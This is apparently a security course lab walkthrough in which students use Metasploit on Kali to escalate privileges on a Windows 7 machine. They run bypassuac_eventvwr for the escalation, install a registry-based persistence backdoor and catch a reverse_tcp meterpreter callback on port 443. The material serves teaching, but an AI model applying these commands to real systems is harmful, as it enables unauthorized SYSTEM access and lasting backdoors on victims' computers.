---
layout: editorial
---

# Persistence

## Discussion

Threat actors persist in networks if the need to do so is one of their goals. They may persist to collect new information created by the organization. For example, if their goal is to steal intellectual property then they would persist to collect that information. It could be intellectual property such as the design of a new car, market segments that are being targeted, weapon systems, or any information that is of value. They can persist by injecting startup commands for a program in the Windows registry. The Windows registry is a large database of all settings for a Windows system. There is a Windows startup folder and any code that is added in that folder will automatically start after a system reboot, or they may inject code that executes when a specific user authenticates to the system.

The type of persistence you’re going to set up is going to have a program that beacons every 10 seconds. Beaconing means every 10 seconds, the program is going to try to connect to your Kali server. That effectively turns your Kali machine into a c2 server (or command and control). Once you set up the listener, then you’ll have another backdoor into their network.

## Lab Preparation

* Re-establish the reverse shell. Check to be sure your IP address didn’t change when you switch network adapters to NETSEC-WAN. I forgot you had to change it for the last lab. If it is different, you will need to recreate the backdoored WinSCP program.

## Start the lab

Run the commands:

**getuid**

**getsystem**

**SUBMISSION: Annotate the screenshot to show the current user and the output of “getsystem.” Based on what you see in the output, did the “getsystem” command work?**

NOTE: getsystem is a meterpreter command that attempts to exploit vulnerabilities and obtain “SYSTEM” level access. Remember that the SYSTEM context is the highest level of privileges on a Windows system.

You’ll note that the ‘getsystem’ command did not work. In that case, we’ll use another module from Metasploit that will look for a ‘local privilege escalation’ attack.

When remote vulnerabilities are not an option, threat actors will attempt to gain access to a computer and, depending on their goals, they may want elevated privileges to persist or gain access to the resources they are targeting. In that case, they will attempt to search for credentials or determine if the current user is in an administrator group. If those fail, they will then check to see what software is installed on a computer. Since many organizations don’t keep their software updated on a regular basis, it is possible to leverage a ‘local privilege escalation’ attack if there is a software program that is vulnerable. The module you are about to run will automate the process of trying to find a local privilege escalation attack.

From the meterpreter prompt run the command:

**background**

Select “y” when asked if you want to background the process. The background command will keep the remote shell session open and allow you to continue using Metasploit. The module to use is the local\_exploit\_suggester. Run the command:

**use post/multi/recon/local\_exploit\_suggester**

Then run:

**show options:**

The main one you need to set is “SESSION.”

Run the command

**sessions**

and make a note of the numeric value in the “Id” field (the leftmost value).

**e.g.**

![e.g.](https://i.imgur.com/OTVaig7.png)

Then use that numeric Id to run the next command (change X to the numeric value of the Id field)

**set SESSION X**

Then run:

**run**

If you receive a message that the process was interrupted by the user,

**e.g.**

![e.g.](https://i.imgur.com/PQbsiIl.png)

run the command **exploit** again.

You will see a long list of potential local privilege escalation vulnerabilities.

**e.g.**

![e.g.](https://i.imgur.com/GZghTCv.png)

You are welcome to play around with the various results to see which one works for you, though one that works is:

_bypassuac\_eventvwr_

So you can run:

use exploit/windows/local/bypassuac\_eventvwr

Then run:

**show options**

You’ll see the only one that needs to be set is “SESSION” so change X below to the numeric value used above for the SESSION.

**set SESSION X**

Then run:

**exploit**

It will look like the screenshot below:

**e.g.**

![e.g.](https://i.imgur.com/B6yOJGh.png)

Regardless of the exploit used, you want to check to see if a Metasploit session was opened. At the meterpret prompt, run:

**getuid**

Note you are still joker. Now run:

**getsystem**

Note how you are running with the SYSTEM context. At this point, you have unrestricted access to the computer. You can create new accounts, delete accounts, or whatever else you want to achieve.

## Creating Persistence

Next you want to create persistence. You are at the point where you can start learning to use the documentation for Metasploit. Below is a link to the Metasploit documentation for setting up persistence. Be sure you READ the entire document to understand what is going on with the attack. Set your Beacon to 10 seconds and **be sure you change the IP address from the tutorial to the the IP of your Kali workstation.**

After you run the create persistence command, then switch to your Windows 7 system and reboot it. Watch your Metasploit console too.

Metasploit Persistence:

[https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/)

NOTE: If you receive an error that the persistence module is deprecated, you’ll need to use the module “**exploit/windows/local/persistence”**

To do so, from your msfconsole, type the command “background”

That will take you back to the console for Metasploit. Then run:\
\
use exploit/windows/local/persistence

set SESSION X

set LPORT 443

exploit

That will create a visual basic script which will be added to the Windows registry to start the backdoor after the user reboots and logs in to their system.\
\
Then, while at your msfconsole, run the commands:\
\
use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse\_tcp

set LHOST IP\_OF\_YOUR\_KALI\_HOST

set LPORT 443

exploit

Then switch to your Windows 7 workstation and reboot it. Watch your Metasploit console when your system reboots.

**SUBMISSION:**

Provide the command you used to setup persistence. If you had to use the “exploit/windows/local/persistence” then take a screenshot of the console with the command and options you set.
